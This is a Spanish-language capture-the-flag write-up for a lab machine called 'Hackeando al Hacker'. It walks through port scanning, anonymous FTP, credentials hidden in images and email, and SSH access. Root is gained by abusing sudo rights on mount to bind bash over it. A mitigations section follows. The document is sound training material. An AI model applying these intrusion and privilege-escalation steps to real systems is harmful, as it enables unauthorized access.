# **🚀 Hackeando al Hacker - Writeup**

> **Una máquina desafiante de *The Hackers Labs* donde debes descifrar pistas, explotar servicios y escalar privilegios en un sistema lleno de secretos.**


---

## **📌 Tabla de Contenidos**

- [🔍 Información General](#-información-general)
- [🎯 Objetivo](#-objetivo)
- [🖥️ Reconocimiento Inicial](#️-reconocimiento-inicial)
- [🔓 Acceso Inicial (Usuario `phantom_ssh`)](#-acceso-inicial-usuario-phantom_ssh)
- [🔐 Escalada de Privilegios (Root)](#-escalada-de-privilegios-root)
- [🎁 BONUS: Secretos Ocultos](#-bonus-secretos-ocultos)
- [🛡️ Mitigaciones y Buenas Prácticas](#️-mitigaciones-y-buenas-prácticas)
- [📜 Referencias y Herramientas](#-referencias-y-herramientas)

---

## **🔍 Información General**

| **Categoría**       | **Detalle**                                                                 |
|---------------------|-----------------------------------------------------------------------------|
| **Dificultad**      | Avanzado                                                                   |
| **Autor**           | [MeTaN01a](https://github.com/MeTaN01a)                                    |
| **Plataforma**      | [The Hackers Labs](https://thehackerslabs.com/)                            |
| **IP de la Máquina**| `10.0.2.31`                                                                |
| **Fecha**           | 5 de Mayo de 2026                                                          |
| **Tags**            | Contraseña débil, Divulgación de información, Privilegios SUDO, Reutilización de contraseñas, Seguridad por oscuridad |

> **⚠️ Advertencia:**
> Las técnicas aquí descritas se realizaron en un entorno controlado con fines educativos y éticos. No nos hacemos responsables del uso indebido de esta información.

---

## **🎯 Objetivo**

Obtener acceso a la máquina y escalar privilegios hasta **`root`**, recolectando las flags correspondientes (`THL_USER.txt` y `THL_ROOT.txt`).

---

## **🖥️ Reconocimiento Inicial**

### **1. Ping y TTL**
Verificamos que la máquina es accesible y determinamos el sistema operativo mediante el **TTL** (64 → Linux).

```bash
ping -c 1 10.0.2.31
```

### **2. Escaneo de Puertos con Nmap**
Realizamos un escaneo rápido de todos los puertos TCP y luego un reconocimiento detallado de los servicios abiertos.

```bash
# Escaneo rápido de puertos
sudo nmap -sS -p- --min-rate 5000 -n -Pn 10.0.2.31 -oN allPorts

# Reconocimiento de servicios
nmap -sCV -p 22,80,995,2121,2222,2323 -n -Pn 10.0.2.31 -oN services
```

**📊 Resultados del Escaneo:**
| **Puerto** | **Servicio**       | **Versión**                          |
|------------|--------------------|--------------------------------------|
| 22/tcp     | SSH                | OpenSSH 9.2p1 Debian 2+deb12u7      |
| 80/tcp     | HTTP               | Apache httpd 2.4.62                  |
| 995/tcp    | SSL/POP3           | Dovecot pop3d                        |
| 2121/tcp   | FTP                | vsftpd 3.0.3                         |
| 2222/tcp   | SSH                | OpenSSH 9.2p1 Debian 2+deb12u7      |
| 2323/tcp   | Telnet             | -                                    |

---

## **🔓 Acceso Inicial (Usuario `phantom_ssh`)**

### **1. Puerto 80 (HTTP)**
La página por defecto de Apache no revela información útil.

### **2. Puerto 2121 (FTP - Anónimo)**
El servicio FTP permite login anónimo. Descargamos los archivos del directorio `pub`:

```bash
ftp -a 10.0.2.31 -p 2121
ftp> ls pub
ftp> get *
```

**📁 Archivos Descargados:**
- `Boleto.jpg` (Imagen con datos ocultos)
- `Manifiesto_0.txt` (Pista sobre Phantom)
- `postal_caribe.jpg` (Imagen con credenciales en esteganografía)
- `postal_caribe.txt` (Texto con pista adicional)

**📜 Contenido de `Manifiesto_0.txt`:**
```text
Manifiesto 0 - Phantom

Como white-hat, securizaba fortalezas ajenas... pero vi las grietas en el sistema.
Las corporaciones pagan por protección, pero el mundo real se desmorona bajo deudas y control.
¿Cuánto más puedo seguir ayudando al enemigo?

Un paraíso lejano me espera... quizás ya estoy allí.

- Phantom
```

### **3. Esteganografía en `postal_caribe.jpg`**
Extraemos credenciales de Telnet ocultas en la imagen:

```bash
cat postal_caribe.jpg | tail -n 6
```
**🔑 Credenciales Obtenidas:**
```text
Telnet 2323
user: phantom
pass: shadow321
```

> **⚠️ Advertencia de Phantom:**
> *"Conecta... pero ¿es real o solo otro cebo de Phantom?"*

### **4. Puerto 2323 (Telnet)**
Nos conectamos con las credenciales obtenidas:

```bash
telnet 10.0.2.31 2323
```
**💬 Mensaje de Bienvenida:**
```
Has entrado al lair de Phantom.
Si no eres yo, ya estás muerto digitalmente...
Pero bienvenido, cazador... ¿cuánto durarás?
- Phantom
Último inicio de sesión: sáb may  2 17:16:21 CEST 2026 de 10.0.2.3 en pts/0
Tiene correo.
```

### **5. Servicio POP3 Local (Puerto 110)**
Phantom nos indica que hay un servidor POP3 local. Intentamos acceder:

```bash
telnet 127.0.0.1 110
USER phantom
PASS shadow321
list
retr 1
```
**📧 Correo Recibido (`RETR 1`):**
```text
From: Phantom <phantom@local>
To: phantom@local
Subject: Credenciales SSH - No las compartas, novato

Usuario: phantom_ssh
Contraseña: ThL_sh@d0w2026!

Conecta a SSH puerto 2222 con estas... pero ¿es el camino real?
No tardes, el tiempo corre... y yo ya estoy en el Caribe.

- Phantom
```

### **6. Acceso SSH (Puerto 2222)**
Usamos las credenciales obtenidas para acceder como `phantom_ssh`:

```bash
ssh phantom_ssh@10.0.2.31 -p 2222
```
**🎉 Mensaje de Bienvenida:**
```
Has entrado al lair de Phantom.
Si no eres yo, ya estás muerto digitalmente...
Pero bienvenido, cazador... ¿cuánto durarás?
- Phantom
```

**📂 Archivos en el Directorio de `phantom_ssh`:**
- `manifest1.log` (Continuación de la historia)
- `THL_USER.txt` (Flag del usuario)

**📜 Contenido de `manifest1.log`:**
```text
Manifiesto 1 - Phantom

Lo cansado que estoy ayudando a las corporaciones a securizar sus redes e infraestructuras,
dándome cuenta cómo tienen a las personas endeudadas y cómo el sistema trabaja para dichas corporaciones.
Ayudaba a proteger fortalezas que oprimen... ahora protejo las mías.

El cambio fue inevitable.
¿Tú también estás cansado del sistema, intruso?
O solo eres otro peón?

- Phantom
```

---
## **🔐 Escalada de Privilegios (Root)**

### **1. Privilegios SUDO de `phantom_ssh`**
Revisamos los permisos SUDO:

```bash
sudo -l
```
**📋 Salida:**
```
User phantom_ssh may run the following commands on shadowroot:
    (ALL) NOPASSWD: /usr/sbin/cryptsetup, /bin/mount, /bin/umount, /usr/bin/mkdir
```

### **2. Explotación de `/bin/mount`**
Usamos `mount` para escalar a `root`:

```bash
# Sustituimos mount por bash
sudo /bin/mount -o bind /bin/bash /bin/mount

# Ejecutamos mount para obtener una shell de root
sudo /bin/mount
```
**🎉 ¡Acceso Root!**
```bash
whoami  # root
id      # uid=0(root) gid=0(root)
```

**📂 Archivos en `/root`:**
- `manifest5.txt` (Último manifiesto)
- `THL_ROOT.txt` (Flag de root)
- `mpg123_final.mp3` (Archivo de audio con mensaje de Phantom)

**📜 Contenido de `manifest5.txt`:**
```text
Manifiesto 5 - Phantom

El sistema me expulsó, ahora yo expulso a los intrusos...
Pero tú llegaste lejos, cazador. Has hackeado al hacker?
Te demoraste demasiado... me cansé de esperar, me fui de viaje.
Hasta la próxima, novato.

- Phantom
```

**🎵 Mensaje de Audio (`mpg123_final.mp3`):**
> *"Te demoraste demasiado. Me fui de viaje. Hasta la próxima, novato."*

---

## **🎁 BONUS: Secretos Ocultos**

### **1. Directorio `.cache/phantom_secrets`**
En el directorio de `phantom_ssh` encontramos una estructura de archivos oculta:

```bash
cd ~/.cache/phantom_secrets
tree
```
**📁 Estructura:**
```
.
├── level1
│   └── clue.txt
├── level2
│   └── key.txt
└── final_trap
    ├── .escape.sh
    └── enter
```

**🔑 Contenido de `key.txt`:**
```text
mazerunner
```

**🚪 Escape de la Trampa:**
```bash
# Ejecutamos el script de escape
./.escape.sh
# Entramos "mazerunner" → Atrapado
# Entramos "rennurezam" → ¡Escapamos!
```

**🔒 Jaula de Phantom (`enter`):**
Al introducir `rennurezam` como contraseña, escapamos de la jaula.

---

## **🛡️ Mitigaciones y Buenas Prácticas**

Para evitar vulnerabilidades como las explotadas en esta máquina, se recomienda:

✅ **🔐 Almacenamiento Seguro de Credenciales**
- Usar gestores de contraseñas como **Bitwarden**, **KeePass** o **1Password**.
- Evitar almacenar contraseñas en archivos de texto plano o en la memoria del sistema.

✅ **🚫 Evitar Seguridad por Oscuridad**
- Implementar mecanismos de seguridad auditables y robustos.
- Documentar y revisar periódicamente los permisos y configuraciones.

✅ **🔄 Políticas de Contraseñas Fuertes**
- Evitar contraseñas débiles o presentes en listas como **rockyou.txt**.
- Usar generadores de contraseñas seguras y aplicar políticas de expiración.

✅ **🔄 Reutilización de Contraseñas**
- Cada cuenta/servicio debe tener una contraseña única.
- Usar autenticación multifactor (MFA) siempre que sea posible.

✅ **🔄 Parcheo y Actualización**
- Mantener todos los servicios y sistemas actualizados.
- Monitorear vulnerabilidades conocidas (CVE) y aplicar parches rápidamente.

✅ **🔐 Principio de Privilegio Mínimo**
- Conceder solo los permisos necesarios a cada usuario.
- Revisar periódicamente los permisos SUDO y archivos sensibles.

📌 **📚 Recursos Recomendados:**
- [CIS Benchmarks](https://www.cisecurity.org/cis-benchmarks/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)

---

## **📜 Referencias y Herramientas**

| **Herramienta**       | **Uso**                                                                 |
|-----------------------|-------------------------------------------------------------------------|
| `nmap`                | Escaneo de puertos y servicios.                                         |
| `ftp`                 | Conexión al servicio FTP anónimo.                                       |
| `telnet`              | Conexión al servicio Telnet.                                            |
| `openssl`             | Conexión a servicios POP3S.                                             |
| `stegseek`            | Extracción de datos ocultos en imágenes (esteganografía).              |
| `ssh`                 | Acceso remoto seguro.                                                   |
| `sudo -l`             | Listar permisos SUDO.
